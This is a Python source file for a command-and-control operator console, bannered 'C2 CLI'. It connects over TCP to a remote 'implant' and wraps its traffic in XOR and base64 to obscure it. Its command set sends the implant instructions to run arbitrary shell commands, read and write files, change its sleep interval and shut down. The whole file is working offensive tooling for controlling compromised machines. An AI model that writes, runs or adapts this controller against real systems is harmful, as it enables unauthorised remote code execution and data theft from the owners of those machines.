#!/usr/bin/env python3

import socket
import json
import base64
import sys
import argparse

try:
    from rich.console import Console
    from rich.syntax import Syntax
    from rich.panel import Panel
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter
    _PT = True
except ImportError:
    _PT = False


XOR_KEY = b'keyed_up'

def _xor(data):
    k = len(XOR_KEY)
    return bytes([b ^ XOR_KEY[i % k] for i, b in enumerate(data)])

def encode(msg):
    return base64.b64encode(_xor(json.dumps(msg).encode()))

def decode(data):
    return json.loads(_xor(base64.b64decode(data)).decode())


class ImplantConn:
    def __init__(self, host, port):
        self.host  = host
        self.port  = port
        self._sock = None
        self._req  = 1

    def connect(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self.host, self.port))

    def close(self):
        if self._sock:
            self._sock.close()
            self._sock = None

    def send(self, cmd_type, payload):
        msg  = {"type": cmd_type, "request_id": self._req, "payload": payload}
        data = encode(msg)
        self._sock.sendall(len(data).to_bytes(4, "big") + data)
        self._req += 1
        return self._recv()

    def _recv(self):
        raw = self._recv_n(4)
        n   = int.from_bytes(raw, "big")
        return decode(self._recv_n(n))

    def _recv_n(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Implant closed the connection")
            buf += chunk
        return buf


def print_response(resp):
    text = json.dumps(resp, indent=2)
    if _RICH:
        rtype  = resp.get("type", "")
        border = "red" if rtype == "error" else "green"
        title  = f"[bold]{rtype}[/bold]  req={resp.get('request_id','?')}"
        console.print(Panel(
            Syntax(text, "json", theme="monokai", word_wrap=True),
            title=title, border_style=border,
        ))
    else:
        print("Response:", text)

def err(msg):
    if _RICH: console.print(f"[!] {msg}", style="bold red")
    else: print(f"[!] {msg}")

def info(msg):
    if _RICH: console.print(f"[*] {msg}", style="bold cyan")
    else: print(f"[*] {msg}")


COMMANDS = ["HELLO","SHUTDOWN","SET_SLEEP","READ_DATA","WRITE_DATA","RUN_CMD",
            "help","exit","quit"]

HELP_TEXT = """
  HELLO                          Ping the implant
  SET_SLEEP <seconds>            Set implant sleep interval
  RUN_CMD   <command>            Execute a shell command
  READ_DATA  [filename]          Read a file from the implant
  WRITE_DATA <filename> <data>   Write data to a file on the implant
  SHUTDOWN                       Shut the implant down
  exit / quit                    Disconnect and exit
"""

BANNER = r"""
  ██████╗██████╗      ██████╗██╗     ██╗
 ██╔════╝╚════██╗    ██╔════╝██║     ██║
 ██║      █████╔╝    ██║     ██║     ██║
 ██║     ██╔═══╝     ██║     ██║     ██║
 ╚██████╗███████╗    ╚██████╗███████╗██║
  ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
   Operator CLI  |  XOR/b64 TCP implant
"""


def run_repl(conn):
    if _RICH: console.print(BANNER, style="bold cyan")
    else: print(BANNER)

    info(f"Connected to implant at {conn.host}:{conn.port}")
    info("Type 'help' for commands\n")

    if _PT:
        session = PromptSession(
            history=InMemoryHistory(),
            auto_suggest=AutoSuggestFromHistory(),
            completer=WordCompleter(COMMANDS, ignore_case=True),
        )
        _input = lambda: session.prompt("> ")
    else:
        _input = lambda: input("> ")

    while True:
        try:
            line = _input().strip()
        except (KeyboardInterrupt, EOFError):
            print(); break

        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].upper()
        args  = parts[1:]

        if cmd in ("EXIT", "QUIT"):
            break
        if cmd == "HELP":
            print(HELP_TEXT); continue

        if cmd == "HELLO":
            payload = {}
        elif cmd == "SHUTDOWN":
            payload = {}
        elif cmd == "SET_SLEEP":
            if not args: err("Usage: SET_SLEEP <seconds>"); continue
            try: payload = {"seconds": int(args[0])}
            except ValueError: err("Seconds must be an integer"); continue
        elif cmd == "READ_DATA":
            payload = {"filename": args[0]} if args else {}
        elif cmd == "WRITE_DATA":
            if len(args) < 2: err("Usage: WRITE_DATA <filename> <data>"); continue
            payload = {"filename": args[0], "data": " ".join(args[1:])}
        elif cmd == "RUN_CMD":
            if not args: err("Usage: RUN_CMD <command>"); continue
            payload = {"command": " ".join(args)}
        else:
            err(f"Unknown command: '{cmd}'. Type 'help'."); continue

        try:
            resp = conn.send(cmd, payload)
            print_response(resp)
        except ConnectionError as exc:
            err(f"Lost connection: {exc}"); break
        except Exception as exc:
            err(f"Error: {exc}"); continue

        if cmd == "SHUTDOWN":
            break

    conn.close()
    info("Disconnected.")


def main():
    parser = argparse.ArgumentParser(description="Operator CLI")
    parser.add_argument("host")
    parser.add_argument("port", nargs="?", type=int, default=4444)
    a = parser.parse_args()

    conn = ImplantConn(a.host, a.port)
    try:
        conn.connect()
    except Exception as exc:
        err(f"Cannot connect to {a.host}:{a.port} — {exc}")
        sys.exit(1)

    run_repl(conn)


if __name__ == "__main__":
    main()
